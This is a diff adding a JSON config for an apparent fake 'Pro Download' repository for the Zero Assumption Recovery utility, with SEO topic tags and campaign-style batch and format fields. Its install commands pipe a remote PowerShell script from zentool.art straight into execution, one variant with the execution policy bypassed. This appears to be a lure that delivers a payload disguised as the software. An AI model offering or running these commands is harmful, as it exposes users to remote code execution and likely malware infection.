@@ -1,0 +1,28 @@
+{
+  "repo": "Zero-Assumption-Recovery-Pro-Download",
+  "product": "Zero Assumption Recovery Pro Download",
+  "product_title": "Zero Assumption Recovery",
+  "kind": "utility",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-zentool-moltora-pending",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "backup",
+  "topics": [
+    "zero-assumption-recovery-windows",
+    "zero-config",
+    "zero-integration",
+    "zero-latest",
+    "data-recovery",
+    "file-recovery",
+    "disk-recovery",
+    "partition-manager",
+    "storage-tools",
+    "file-restore",
+    "ntfs",
+    "backup-software"
+  ],
+  "site": "zentool.art"
+}
